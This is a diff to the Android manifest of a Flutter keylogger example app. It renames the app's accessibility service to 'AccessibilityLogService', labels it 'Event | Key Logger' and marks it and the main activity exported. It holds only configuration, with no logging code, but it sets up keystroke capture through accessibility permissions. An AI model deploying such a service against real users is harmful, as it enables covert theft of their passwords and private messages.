@@ -2,13 +2,13 @@
     package="youtube.sidtube.flutterkeylogger_example">
 
     <application
-        android:name="io.flutter.app.FlutterApplication"
         android:label="flutterkeylogger_example"
         android:icon="@mipmap/ic_launcher">
         <activity
             android:name=".MainActivity"
             android:launchMode="singleTop"
             android:theme="@style/LaunchTheme"
+            android:exported="true"
             android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
             android:hardwareAccelerated="true"
             android:windowSoftInputMode="adjustResize">
@@ -27,9 +27,10 @@
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
-        <service android:name="youtube.sidtube.flutterkeylogger.Accservice"
+        <service android:name="youtube.sidtube.flutterkeylogger.AccessibilityLogService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:label="just for fun">
+            android:exported="true"
+            android:label="Event | Key Logger">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
